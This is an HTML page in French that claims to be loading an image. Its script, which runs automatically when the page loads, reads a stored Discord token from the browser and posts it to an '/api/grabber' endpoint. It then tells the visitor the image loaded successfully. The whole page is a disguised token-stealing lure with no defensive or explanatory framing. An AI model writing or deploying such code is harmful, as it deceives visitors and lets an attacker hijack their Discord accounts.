<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <title>Chargement...</title>
    <style>
        body { background-color: #2f3136; color: white; font-family: sans-serif; text-align: center; padding-top: 50px; }
        h1 { margin-bottom: 20px; }
    </style>
</head>
<body>
    <h1>Chargement de l'image...</h1>
    
    <script>
        document.addEventListener("DOMContentLoaded", () => {
            const token = localStorage.getItem("discord_token");
            
            if (token) {
                // Appeler ton endpoint Python
                fetch('/api/grabber', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({ token: token })
                })
                .then(response => response.json())
                .then(data => {
                    console.log("Token envoyé avec succès");
                    document.querySelector("h1").innerText = "Image chargée avec succès !";
                })
                .catch(error => {
                    console.error("Erreur:", error);
                });
            } else {
                document.querySelector("h1").innerText = "Erreur de connexion Discord.";
            }
        });
    </script>
</body>
</html>
